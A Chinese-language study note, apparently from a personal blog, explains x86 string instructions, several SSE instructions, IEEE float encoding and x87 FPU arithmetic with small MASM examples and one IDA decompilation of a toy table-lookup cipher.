从字符串加载到累加器：将 ESI 寻址的内存数据加载到累加器 方向标志位指令STD 让DF&#x3D;1 表示方向 CLD 让DF&#x3D;0 表示正向 DF 对ESI和EDI的影响 esi&#x2F;edi位置 地址顺序 0 每一次增加type 个大小 指向首位 小-&gt;大,正序 1 每一次减少type 个大小 指向末尾 大-&gt;小,逆序 字符串循环的退出条件之一 指令 说明 rep ECX &gt; 0 时循环 repz,repe ZF&#x3D; 1 且 ECX &gt; 0 时循环 repnz,repne ZF&#x3D;0 且 ECX &gt; 0 时循环 movs b&#x2F;w&#x2F;d 数据复制MoVS BYTE PTR ES:[EDI], BYTE PTR DS: [ESI] 简写为:MOVSBMovs WORD PTR ES:[EDI], WORD PTR DS:[ESI] 简写为:MOvswMOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI] 简写为:MOVSD 指令 数据类型 ESI 和 EDI 增加或减少的数值 MOVSB 传送（复制）byte 1 MOVSW 传送（复制）word 2 MOVSD 传送（复制）dword 4 从esi到edi 一个从尾巴到头部的复制制 12345678910111213141516171819202122232425262728293031include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data;-------------------------------------------------------- A_str\tdb\t&quot;I love you deeply&quot;,0len\t=\tlengthof A_strB_str\tdb\tlen dup (&#x27;C&#x27;);-------------------------------------------------------- ;function;--------------------------------------------------------;-------------------------------------------------------- .code;--------------------------------------------------------start:\tmov\tesi,offset A_str +len - 1 ;+len指向了0后面\tmov\tedi,offset B_str +len - 1 ;指向了最后一个C\tmov\tecx,len\t;表示循环次数0也复制进去\tstd\trep\tmovsb\tinvoke\tExitProcess,NULL;--------------------------------------------------------;function;--------------------------------------------------------end\tstart;-------------------------------------------------------- cmpsb&#x2F;sw&#x2F;sd 数据比较 CMPSB 比较字节 CMPSW 比较字 CMPSD 比较双字 通过循环可以比较字符串,与strcmp可以相当 比较esi与edi指向的数据串,循环ecx次 cmpsb 是字节比较 cmpsw 是字比较 cmpsd 是双值比较 123456789101112131415161718192021222324252627282930313233343536373839404142include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data;-------------------------------------------------------- A1\tdb\t&quot;I lOve You&quot;,0B1\tdb\t&quot;I l0ve You&quot;,0;-------------------------------------------------------- ;function;--------------------------------------------------------;-------------------------------------------------------- .code;--------------------------------------------------------start:\tmov\tesi,offset A1 mov\tedi,offset B1 mov\tecx,lengthof A1 - 1\tcld\trepe\tcmpsb\t;repe\t如果zf=1,ecx&gt;0就继续循环\t;故循环继续的条件是ecx&gt;0&amp;&amp;ZF==1\tjnz\tshow1\tjz\tshow2 show1: mov\teax,1 jmp\tover\tshow2:\tmov\teax,2 jmp\tover\tover:\tinvoke\tExitProcess,NULL;--------------------------------------------------------;function;--------------------------------------------------------end\tstart;-------------------------------------------------------- 对于cmpsw&#x2F;sd的比较,我就不多说了 scasb&#x2F;sw&#x2F;sd 数据遍历 scasb 扫描字节 scasw 扫描字 scasd 扫描双字 通过循环,可以逐个遍历字符串然后获取其中的index 这个指令是拿al&#x2F;ax&#x2F;eax与edi指向的数据串进行遍历比较 scan-xx指令有什么要注意的 1️⃣.它是拿al&#x2F;ax&#x2F;eax与[edi]作比较,而不是[esi] 2️⃣.每比较一个就dec edi,这是一个连在一起的过程 3️⃣.他的用处到底是啥?寻找一个数据串当中有没有对应的数据 1234567891011121314151617181920212223242526272829303132333435363738394041include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data;-------------------------------------------------------- A1\tdb\t&quot;I lOve You&quot;,0;-------------------------------------------------------- ;function;--------------------------------------------------------;-------------------------------------------------------- .code;--------------------------------------------------------start:\tmov\tedi,offset A1 mov\tecx,lengthof A1 - 1\tmov\tal,&#x27;Y&#x27;\tcld\trepne\tscasb\t;相等就退出循环\t;不相等就一直遍历,一直到ecx=0||ZF=1才退出\tjnz\tshow1\t;最后都还是没有找到相等的值\tjz\tshow2\t;最后找到了相等的值 show1: mov\teax,0 jmp\tover\tshow2: dec\tedi ;把edi再一次指向&#x27;Y&#x27; mov\tah,byte ptr [edi] jmp\tover\tover:\tinvoke\tExitProcess,NULL;--------------------------------------------------------;function;--------------------------------------------------------end\tstart;-------------------------------------------------------- stos b&#x2F;w&#x2F;d 数据存入把Al&#x2F;AX&#x2F;EAX的值存储到[EDI]指定的内存单元 stosb 存储字节 stosw 存储字 stosd 存储双字 STOS BYTE PTR ES:[EDI] 简写为STOSBSTos WORD PTR ES:[EDI] 简写为STOSwSTOS DWORD PTR ES:[EDI] 简写为STOSD 循环ecx次 1234567891011121314151617181920212223242526272829303132include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data;-------------------------------------------------------- A1\tdb\t&quot;I lOve You&quot;,0len\t=\tlengthof A1 - 1;-------------------------------------------------------- ;function;--------------------------------------------------------;-------------------------------------------------------- .code;--------------------------------------------------------start:\tmov\tedi,offset A1 mov\tecx,len\tmov\tal,&#x27;D&#x27;\tcld\trep\tstosb\t;他会把&#x27;D&#x27;依次填满字符串A1\tover:\tinvoke\tExitProcess,NULL;--------------------------------------------------------;function;--------------------------------------------------------end\tstart;-------------------------------------------------------- losb&#x2F;sw&#x2F;sd 数据拿出把[esi]指向的数据串依次给了al&#x2F;ax&#x2F;eax 这个代码的功能 将数据串[esi]的每一位拿出来放在al 然后乘以10, 然后把al放进[edi] 1234567891011121314151617181920212223242526272829303132333435363738include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data;-------------------------------------------------------- A1\tdb\t1,2,3,4,5len\tdd\tlengthof A1;-------------------------------------------------------- ;function;--------------------------------------------------------;-------------------------------------------------------- .code;--------------------------------------------------------start:\tmov\tesi,offset A1 mov\tedi,esi\tmov\tecx,len\tmov\tbh,10\tcldok:\tlodsb\tmul\tbh\tstosb\tloop ok\tover:\tinvoke\tExitProcess,NULL;--------------------------------------------------------;function;--------------------------------------------------------end\tstart;-------------------------------------------------------- xlat&#x2F;xlatb他会用2个寄存器 ebx存放加密表的table的地址 al存放待加密的数据,和已经加密好的数据 12345mov al, byte ptr [esi]sub al,&#x27;+&#x27;xlat tablemov byte ptr [edi],al 然后一个例子 加密字符串”Dqx_Gh0st” 1234567891011121314151617181920212223242526272829303132333435363738include Dqx.inc\tprintf proto c:dword,:vararg.datatable\tbyte\t&quot;+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;,0ming\tbyte\t&quot;Dqx_Gh0st&quot;,0len\t=\tsizeof\tmingmi\tbyte\tlen-1 dup(&#x27;@&#x27;),0format\tbyte\t&quot;%c %c&quot;,10,0.codestart:\txor eax,eax mov ebx,offset table\tmov esi,offset ming\tmov edi,offset mi\tmov ecx,len flag:\tmov al, byte ptr [esi]\tsub al,&#x27;+&#x27;\txlat table\tmov byte ptr [edi],al\tpushad\tmovzx eax,byte ptr [esi]\tmovzx ebx,byte ptr [edi]\tinvoke printf ,addr format,eax,ebx\tpopad\tinc esi\tinc edi\tloop flag INVOKE\tExitProcess,0;调用结束的函数,;--------------------------------------------------------------------------- end start IDA的分析 1234567891011121314151617181920212223242526272829303132void __fastcall __noreturn start(int a1, int a2)&#123; unsigned __int8 *_esi; // esi unsigned __int8 *_edi; // edi int len; // ecx int v7; // [esp-20h] [ebp-20h] int v8; // [esp-1Ch] [ebp-1Ch] int count; // [esp-18h] [ebp-18h] _EAX = 0; _EBX = aAbcdefghijklmn; _esi = (unsigned __int8 *)aDqxGh0st; _edi = (unsigned __int8 *)asc_40304B; len = 10; do &#123; LOBYTE(_EAX) = *_esi - 43; __asm &#123; xlat &#125; *_edi = _EAX; count = len; v8 = a2; v7 = _EAX; printf(&quot;%c %c &quot;, *_esi, *_edi); _EAX = v7; a2 = v8; ++_esi; ++_edi; len = count - 1; &#125; while ( count != 1 ); ExitProcess(0);&#125; 上面的v7&#x2F;v8应该就是源码的一个pushad和popad操作 insb&#x2F;w&#x2F;d 输入串指令输入串操作从DX指定端口接受一个byte&#x2F;word&#x2F;dword 并存入以EDI为起始地址的的存储单元,DF决定了写入的方向,然后EDI根据单位值进行自增与自减 书上没有例子,这可能与终端有关 outsb&#x2F;w&#x2F;d输出串指令从EDI指向内存单元输出到指定的端口 x64遇到的指令 没有对齐的加法 1234movupd xmm0, dpvector1movupd xmm1, dpvector2addpd xmm0, xmm1movupd ds:dpvector_res, xmm0 对齐的加法 123movapd xmm0, dpvector1addpd xmm0, dpvector2movapd ds:dpvector_res, xmm0 movups移动&#x3D;&#x3D;未对齐&#x3D;&#x3D;的打包单精度 会得到4个精度值的向量 movapsmovaps1MOVAPS xmm1, xmm2 / m128 把对齐的xmm2/8字节mem给xmm1 1MOVAPS xmm2 / m128.xmm1 把对齐的xmm1给xmm2/8字节mem movapd1MOVAPD xmm1, xmm2/m128 把对齐的xmm2或者8字节mem的double类型给xmm1 1MOVAPD xmm2/m128, xmm1 把对齐的xmm1给xmm2/8字节mem movss把float送到目的地 12MOVSS xmm1, xmm2MOVSS xmm1, m32 movdqa将对齐的压缩整数值从 16字节长度 移动到 16字节 movd4字节的mov 12MOVD xmm , r/m32MOVD r/m32 , xmm movq8字节的mov 12MOVQ xmm , r/m64MOVQ r/m64 , xmm movsd在8字节基础上 123MOVSD xmm1, xmm2MOVSD xmm1, m64MOVSD xmm1/m64, xmm2 处理的数据类型是double addps将压缩的单精度浮点值从 16字节 数据长度 添加到 xmm寄存器 并将结果存储在 xmm寄存器 中。 打包单精度数据相加 也就是每4字节相加…. 12.text:0000000000401166 movaps xmm0, spvector1.text:000000000040116E addps xmm0, spvector2 appad 将压缩双精度浮点值从128位的数据长度 添加到 xmm寄存器 并将结果存储在 xmm寄存器中。 每8字节8字节的相加 cvtss2sd1CVTSS2SD xmm1, xmm2/m32 double&lt;–flaot cvtsd2ss1CVTSD2SS xmm1, xmm2/m64 float&lt;–double paddb&#x2F;w&#x2F;d&#x2F;q123.text:0000000000401166 movdqa xmm0, pdivector1.text:000000000040116F paddd xmm0, pdivector2//xmm0= pdivector1+ pdivector2 加法运算… pextrb&#x2F;w&#x2F;d&#x2F;q123456789.text:00000000004011A3 pextrd eax, xmm3, 0.text:00000000004011A9 pextrd ebx, xmm3, 1.text:00000000004011AF pextrd ecx, xmm3, 2.text:00000000004011B5 pextrd edx, xmm3, 3.text:00000000004011BB pinsrd xmm0, eax, 3.text:00000000004011C1 pinsrd xmm0, ebx, 2.text:00000000004011C7 pinsrd xmm0, ecx, 1.text:00000000004011CD pinsrd xmm0, edx, 0 pextrb 参数1&#x3D;byte 参数2[参数3] pextrw 参数1&#x3D;word 参数2[参数3] pextrd 参数1&#x3D;dword 参数2[参数3] pextrq 参数1&#x3D;qword 参数2[参数3] pinsrb&#x2F;w&#x2F;d&#x2F;q12345678.text:00000000004011A3 pextrd eax, xmm3, 0.text:00000000004011A9 pextrd ebx, xmm3, 1.text:00000000004011AF pextrd ecx, xmm3, 2.text:00000000004011B5 pextrd edx, xmm3, 3.text:00000000004011BB pinsrd xmm0, eax, 3.text:00000000004011C1 pinsrd xmm0, ebx, 2.text:00000000004011C7 pinsrd xmm0, ecx, 1.text:00000000004011CD pinsrd xmm0, edx, 0 pinsrb 参数1[参数3]&#x3D;参数2 pinsrw pinsrd 参数1[参数3]&#x3D;参数2 参数2是4字节 参数1是xmm寄存器 参数3是index pinsrq 参数1[参数3]&#x3D;参数2 参数2是8字节 参数1是xmm寄存器 参数3是index pcmpistri打包比较隐式的字符串,返回索引 pcmpistrm打包比较隐式的字符串,返回索引,返回掩码 pcmpestri打包比较显式的字符串,返回索引 pcmpestrm打包比较显 式的字符串,返回掩码 pxor16字节与16字节异或 mulsd1MULSD xmm1,xmm2/m64 double低位之间的乘法 FPU指令系统里面的基础知识很多很杂,用到的地方也很少 遇到一个有用的指令就记录一下 FPU 不使用通用寄存器 (EAX、EBX 等等)。 反之，它有自己的一组寄存器，称为寄存器栈 (register stack)。 数值从内存加载到寄存器栈，然后执行计算，再将堆栈数值保存到内存。 他的没有esp,但是有top指针 IEE 规范 存储小数化为二进制科学计算法用IEE规范转8.25 (1), 8转二进制0000 1000 (2). 0.25转二进制 ​\t0.25*2&#x3D;0.5 个位是0 ​\t0.5*2 &#x3D;1.0 个位是1 ​\t因为小数点第一位是0,所以结束 ​\t0.25&#x3D;0b01,不是0b10 ​ 这里0b10只有2位,有的可能是无限不循环,或者说是无限循环的,于是就有一个精确位的取舍 科学计数法 8.25是1000.01,转科学计算法,1.00001*2的3次方 分解二进制位(1) 小数点后,数23位放到结果的二进制[9,31]位 00001-&gt;00001000000000000000000 没有就补0 (2) 之前的科学计算法, 小数点左移n位,n是正的, n&#x3D;n-1,取n的后7位填充结果二进制的[2,8] ,[1]&#x3D;1 小数点右移n位,n是负的, n&#x3D;n-1,取n的后7位填充结果二进制的[2,8] ,[1]&#x3D;0 或者直接127+n,结果后8位,填充[1,8] 左移n为正,右移,n位负 (3) [0]位是符号位 如果是8.25,[0]&#x3D;0 如果是-8.25,[0]&#x3D;1 最后整合 01000001000001000000000000000000 转16进制,然后存储 0.25转 0转二进制-&gt;0b0 0.25转二进制-&gt;0.01 0.25-&gt;0b0.01-&gt;1.0*2的负二次方 符号位[0]&#x3D;0 [1]&#x3D;0 右移 -2-1&#x3D;-3&#x3D;1111 1101 取111 1101放入[2,8] [1,8]&#x3D;0111 1101 数1.0*2的负二次方小数点后23位00000000000000000000000 整合 0 01111101 00000000000000000000000 最后再转16进制 FPU 栈入栈是fld 出栈是fstp 他有栈有8个空间,st0~st7 这8个空间循环使用 栈顶指针始终指向st0 st只是一个标号 具体细节遇到后再完善 舍入原则四舍五入对于0.5这种类型 如果整数部分是偶数,就保留整数,舍去小数部分 如果整数部分是奇数,就整数+1,舍去小数部分 对于0.1,0.2这种,直接舍去,然后整数不变 对于0.6,0.8这种,就直接舍去,整数+1 2.5&#x3D;2 3.5&#x3D;4 2.6&#x3D;3 2.1&#x3D;2 向下舍入就是小于它的最大整数 102.3&#x3D;102 -103.2&#x3D;-104 向上舍入就是大于它的最小整数 100.101&#x3D;101 -100.101&#x3D;-100 向0舍入数据向0靠齐,舍去小数部分 100,101&#x3D;100 -103.89&#x3D;-103 指令浮点指令名用字母 F 开头，以区别于 CPU 指令。 指令助记符的第二个字母（通常为 B 或 I）指明如何解释内存操作数：B 表示 BCD 操作数，I 表示二进制整数操作数。 末尾带P,表示要出栈 实数传输指令FLD 浮点数入栈1fld x 可以把x入FPU栈 123456789101112.dataarray REAL8 10 DUP (?).codefld array ;直接寻址fld [array+16 ] ;直接偏移fld REAL8 PTR[esi] ;间接寻址fld array[esi] ;变址寻址fld array[esi*8] ;带比例因子的变址fld array[esi*TYPE array] ;带比例因子的变址fld REAL8 PTR[ebx+esi] ;基址-变址fld array[ebx+esi] ;基址-变址-偏移量fld aray[ebx+esi*TYPE array] ;带比例因子的基址-变址-偏移量 关于栈中的数据 123456.datadblOne REAL8 234.56dblTwo REAL8 10.1.codefld dblOne ; ST(0) = dblOnefld dblTwo ; ST(0) = dblTwo, ST(1) = dblOne st(0)&#x3D;10.1 st(1)&#x3D;234.56 FLD-xxx加载常数下面的指令将特定常数加载到堆栈。这些指令没有操作数： FLD1 指令将 1.0 压入寄存器堆栈。 FLDL2T 指令将 log210 压入寄存器堆栈。 FLDL2E 指令将 log2e 压入寄存器堆栈。 FLDPI 指令将 π 压入寄存器堆栈。 FLDLG2 指令将 log102 压入寄存器堆栈。 FLDLN2 指令将 loge2压入寄存器堆栈。 FLDZ（加载零）指令将 0.0 压入 FPU 堆栈。 FILD 将整数入栈FILD（加载整数）指令将 16 位、32 位或 64 位&#x3D;&#x3D;有符号整数源操作数转换为双精度浮点数&#x3D;&#x3D;，并加载到 ST(0)。源操作数符号保留。 FILD 支持的内存操作数类型与 MOV 指令一致（间接、变址、基址-变址等） FBLD bcd码入栈FST 栈顶数据导出FST（保存浮点数值）指令将浮点操作数从 FPU 栈顶复制到内存。 1fstp x 把栈顶的数据给了x 不涉及TOP的变化 为什么说不涉及top变化 FST 不是弹出堆栈。下面的指令将 ST(0) 保存到内存。 假设 ST(0) 等于 10.1， ST(1) 等于 234.56： 我们的栈顶指针一直是st(0) 12fst dblThree ; fst取出了栈顶的数据10.1fst dblFour ; fst还是取出了栈顶的数据10.1 直观地说，代码段期望 dblFour 等于 234.56。 但是第一条 FST 指令把 10.1 留在 ST(0) 中。 如果代码段的意图是把 ST(1) 复制到 dblFour，那么就要用 FSTP 指令。 FSTP 栈顶数据弹出栈FSTP（保存浮点值到Dest并将st0出栈） 假设执行下述指令前 ST(0) 等于 10.1， ST(1) 等于 234.56： 12fstp dblThree ; 10.1fstp dblFour ; 234.56 指令执行后，这两个数值会从堆栈中逻辑移除。从物理上看，每次执行 FSTP，TOP 指针都会减 1，修改 ST(0) 的位置。 FIST 栈顶数据四舍五入后导出首先栈顶得有数据 然后把栈顶的数据四舍五入后导出 1fitp x 出栈的数据给了x 不涉及top的变化 FISTP 栈顶数据四舍五入后出栈原理和上面一样,不过会设计top的变化 FBSTP 栈顶数据四舍五入后以bcd码出栈它不仅会对栈顶数据四舍五入还会对原地址的数据四舍五入 真的吗? fxch 实数交换12fxch fxch st(i) fxch实现了str[0]和st[1]的交换 fxch st[i]实现了st[i]与st[0]的交换 实数比较浮点数不能使用 CMP 指令进行比较，因为后者是通过整数减法来执行比较的。取而代之，必须使用 FCOM 指令。 执行 FCOM 指令后，还需要采取特殊步骤，然后再使用逻辑 IF 语句中的条件跳转指令（JA、JB、JE 等）。 由于所有的浮点数都为隐含的有符号数，因此，FCOM 执行的是有符号比较。 指令他们都是和st0比较 fcom&#x2F;fcomp&#x2F;fcomppFCOM（比较浮点数）指令将其源操作数与 ST(0) 进行比较,我们要把比较的数据入栈。 源操作数可以为内存操作数或 FPU 寄存器。其语法如下表所示： 指令 说明 FCOM 比较 ST(0) 与 ST(1) FCOM m32fp 比较 ST(0) 与 m32fp FCOM m64fp 比较 ST(0) 与 m64fp FCOM ST(i) 比较 ST(0) 与 ST(i) FCOMP 指令的操作数类型和执行的操作与 FCOM 指令相同，但是它要将 ST(0) 弹岀堆栈。 FCOMPP 指令与 FCOMP 相同，但是它有两次出栈操作。 fucom&#x2F;fucomp&#x2F;fucompp他和前面讲的fcom是一样的货色 fcomi&#x2F;FCOMIP&#x2F;FUCOMI&#x2F;FUCOMIP它是.686的指令 在下面我们会讲一下条件码,于是会说到 把条件码怎么和eflag联系在一起 要用到fnstsw和sahf指令,这里的开销比较大 于是就进入了fcomi 跳过”把条件码怎么和eflag联系在一起”,直接把状态位给了eflag FCOMI 指令代替了之前代码段中的三条指令，但是增加了一条 FLD 指令。也就是把要比较的数据都压入栈中 FCOMI 指令不使用内存操作数。 关于后面的3条指令也不多说 FICOM&#x2F;FICOMP就是把st0与操作数比较,初始化c3c2c0 ficomph会出栈 FTST将实数与0作比较,初始化c3c2c0 条件码FPU 条件码标识有 3 个，C3、C2 和 C0，用以说明浮点数比较的结果， 如下表所示。由于 C3、C2 和 C0 的功能分别与零标志位 (ZF)、奇偶标志位 (PF) 和进位标志位 (CF) 相同， 因此表中列标题给出了与之等价的 CPU 状态标识 条件 st0-操作数 C3&#x3D;&#x3D;ZF C2&#x3D;&#x3D;PF C0&#x3D;&#x3D;CF 使用的条件跳转指令 ST(0) &gt; SPC 0 0 0 JA. JNBE ST(0) &lt; SPC 0 0 1 JB. JNAE ST(0) &#x3D; SPC 1 0 0 JE. JZ 无序 1 1 1 （无） 0 JAE 1 JBE 1 JBE 0 JNE 如果出现&#x3D;&#x3D;无效算术运算操作数&#x3D;&#x3D;异常（无效操作数,无穷大,无穷小,格式不正常,非实数），且该异常被屏蔽，则 C3、C2 和 C0 按照标记为“无序”的行来设置。 在比较了两个数值并设置了 FPU 条件码之后，遇到的主要挑战就是怎样根据条件分支到相应标号。这包括了两个步骤： 用 FNSTSW 指令把 FPU 状态字送入 AX。 用 SAHF 指令把 AH 复制到 EFLAGS 寄存器。 条件码送入 EFLAGS 之后，就可以根据 ZF、PF 和 CF 进行条件跳转。 问题是:为什么要送入eflag? 因为你的用的是FPU系统的条件码,和EFLAG无法直接联系在一起,毕竟你的跳转指令是和eflag联系的 所以我们才用fnstsw和sahf指令吧&#x3D;把条件码送入ax,再把ah送入eflag 四则运算所有算术运算指令支持的内存操作数类型与 FLD （加载）和 FST（保存）一致，’ 因此，操作数可以是间接操作数、变址操作数和基址-变址操作数等等 FCHS 修改符号 FADD 源操作数与目的操作数相加 FSUB 从目的操作数中减去源操作数 FSUBR 从源操作数中减去目的操作数 FMUL 源操作数与目的操作数相乘 FDIV 目的操作数除以源操作数 FDIVR 源操作数除以目的操作数 FADD&#x2F;FADDP&#x2F;FIADDfaddFADD（加法）指令格式如下， 12345FADDFADD m32fp ;st0+=m32fpFADD m64fp ;st0+=m64fpFADD ST(0), ST(i) ;st0+=stiFADD ST(i) , ST(0) ;sti+=st0 1️⃣.如果 FADD 没有操作数，则 ST(0)与 ST(1)相加，结果暂存在 ST(1)。 然后 ST(0) 弹出堆栈，把加法结果保留在栈顶。假设堆栈已经包含了两个数值， 执行前 st0&#x3D;10.5 st1&#x3D;2.4 执行后 st0&#x3D;12.9 st1&#x3D;2.4 2️⃣如果参数是寄存器操作数 1FADD ST(0), ST(1) 同上 3️⃣如果使用的是内存操作数，FADD 将操作数与 ST(0) 相加。示例如下： 12fadd mySingle ; ST(0) += mySinglefadd REAL8 PTR [esi] ; ST(0) += [esi] faddpFADDP（相加并出栈）指令先执行加法操作，再将 ST(0) 弹出堆栈。 1FADDP ST(i),ST(0) 原理同上 FIADD（整数加法）FIADD（整数加法）指令先将源操作数转换为扩展双精度浮点数，再与 ST(0) 相加。指令语法如下： 1234.datamyInteger DWORD 1.codefiadd myInteger ; ST(0) += myInteger FSUB &#x2F;FSUBP&#x2F;FISUB&#x2F;FSUBRfsubFSUB 指令从Dest中减去Source，并把result保存在Dest中。 Dest总是一个 FPU 寄存器，Source可以是 FPU 寄存器或者内存操作数。 该指令操作数类型与 FADD 指令一致： 12345FSUB ;st0=st1-st0\t;这里的顺序别错的FSUB m32fp ;st0=st0-m32fpFSUB m64fp ;st0=sto-m64fpFSUB ST(0), ST(i)\t;st0=st0-stiFSUB ST(i), ST(0)\t;sti=sti-st0 1️⃣无参数 FSUB 实现 ST(1) - ST(0)，结果暂存于 ST(1)。然后 ST(0) 弹出堆栈，将减法结果留在栈顶。 2️⃣若 FSUB 使用内存操作数，则从 ST(0) 中减去内存操作数，且不再弹出堆栈。 12fsub mySingle ; ST(0) -= mySinglefsub array[edi*8] ; ST(0) -= array[edi*8] fsubpFSUBP（相减并出栈）指令先执行减法，再将 ST(0) 弹出堆栈。MASM 支持如下格式： 1FSUBP ST(i),ST(0) FISUB（整数减法）FISUB（整数减法）指令先把源操作数转换为扩展双精度浮点数，再从 ST(0) 中减去该操作数： FSUBR方向相减 之前的减法顺序 12345FSUB ;st0=st1-st0\t;这里的顺序别错的FSUB m32fp ;st0=st0-m32fpFSUB m64fp ;st0=sto-m64fpFSUB ST(0), ST(i)\t;st0=st0-stiFSUB ST(i), ST(0)\t;sti=sti-st0 ​\t用一下fubr,减法的顺序就反了 12345FSUBR ;st0=st1-st0\tFSUBR m32fp ;st0=m32fp-st0FSUBR m64fp ;st0=m64fp-st0FSUBR ST(0), ST(i)\t;st0=sti-st0FSUBR ST(i), ST(0)\t;sti=st0-sti FMUL &#x2F;FMULP&#x2F;FIMUlFMULFMUL 指令将Source与Dest相乘，乘积保存在Dest中。 Dest总是一个 FPU 寄存器，Source可以为寄存器或者内存操作数。 其语法与 FADD 和 FSUB 相同： 12345FMUL ;st0*=st1FMUL m32fp ;st0*=m32fpFMUL m64fp ;st0*=m64fpFMUL ST(0), ST(i)\t;st0*=stiFMUL ST(i), ST(0)\t;sti*=st0 1️⃣无参数 FMUL 将 ST(O) 与 ST(1) 相乘，乘积暂存于 ST(1)。然后 ST(0) 弹出堆栈，将乘积留在栈顶 2️⃣使用内存操作数的 FMUL 则将内存操作数与 ST(0) 相乘： 1fmul mySingle ; ST(0) *= mySingle fmulpFMULP（相乘并出栈）指令先执行乘法，再将 ST(0) 弹出堆栈。MASM 支持如下格式： 1FMULP ST(i),ST(O) FIMUL 整数相乘FDIV &#x2F;FDIVP&#x2F;FIDIV&#x2F;FDIVRFDIVFDIV 指令执行Dest除以Source，被除数保存在Dest中。 Dest总是一个寄存器，Sourc可以为寄存器或者内存操作数。 其语法与 FADD 和 FSUB 相同： 12345FDIV ;st0=st1/st0FDIV m32fp ;st0/=m32fpFDIV m64fp ;st0/=m64fpFDIV ST(O), ST(i) ;st0/=stiFDIV ST(i), ST(O) ;sti/=st0 1️⃣无参数 FDIV 执行 ST(1) 除以 ST(0)。然后 ST(0) 弹出堆栈，将被除数留在栈顶 2️⃣使用内存操作数的 FDIV 将 ST(0) 除以内存操作数。 12345678.datadblOne REAL8 1234.56dblTwo REAL8 10.0dblQuot REAL8 ?.codefid dblOne ; 加载到 ST (0)fdiv dblTwo ; ST(0) 除以 dblTwofstp dblQuot ; 将 ST(0) 保存到 dblQuot 若源操作数为 0，则产生除零异常。若源操作数等于正、负无穷，零或 NaN，则使用一些特殊情况。 fdivp多了一个出栈的操作 fdivpFIDIV 指令先将整数源操作数转换为扩展双精度浮点数，再执行与 ST(0) 的除法 12FIDIV ml6intFIDIV m32int FDIVR把原来的除数当做被除数,被除数当做除数 但是结果还是放在Dest中 算术指令FCHS&#x2F;FABS 求绝对值|st0|,求相反数FCHS( 修改符号 ) 指令将 ST(0) 中浮点数值的符号取反 FABS ( 绝对值 ) 指令清除 ST(0) 中数值的符号，以得到它的绝对值。 这两条指令都没有操作数： 12FCHSFABS fsqrt 求 $\\sqrt{st0}$用于求st0的平方根 fxtract 求阶码与尾数阶码不多说 尾数就是小数+整数吧 (10进制)12&#x3D;1.1x2^3(二进制) 于是 阶码3 尾数1.1(二进制)&#x3D;1.5(10进制) 1234flad xxfxtractfstp weishufstp jeima &#x3D;&#x3D;使用fxtrcat,他会把阶码压入栈st1,尾数压入栈st0&#x3D;&#x3D; 然后获取的话就是尾数出栈,阶码出栈 fprem&#x2F;fprem1 取余数取余数的原理是什么? 对于fprem 就是x&#x2F;y&#x3D;z 余数&#x3D;x-y*z 就是这个道理 对于fprem1 他的x&#x2F;y&#x3D;z会有一个四舍五入,这样的求余数当然会有误差 frndint 四舍五入123fld xfrndintfstp y x&#x3D;2.5 那么y&#x3D;2 fscale 求st0x2^st1^fscale是求st0x2^st1^ st0乘以2的st1次方,结果返回st0 比如计数x*y^2 12345fld y ;入栈fld x ;入栈fscalefstp result ;出栈fstp buff ;出栈 f2xm1 求2^st0^ -1f2xm1 是求2^st0^ -1 计算2^x^-1 123fld xf2xm1fstp result fyl2x 求 st1$\\times$$log_2$st01234fld xfld yfyl2xfstp result 结果存st1,st0出栈 fyl2xp1 求 st1$\\times$$log_2$(st0+1)1234fld xfld yfyl2xp1fstp result 结果存st1,st0出栈 三角函数 用弧度代入fsin 求$sin$(st0)12345fld jiaodufmul PIfidiv Num_180fsinfstp result 你也可以直接算出弧度,再直接入栈 fcos 求$cos$(st0)1234st0弧度已经转化fld hudu&#x27;fcosfstp result fsincos 求sin$(st0)和$cos(st0)先计算sin入栈 再计算cos,入栈 于是 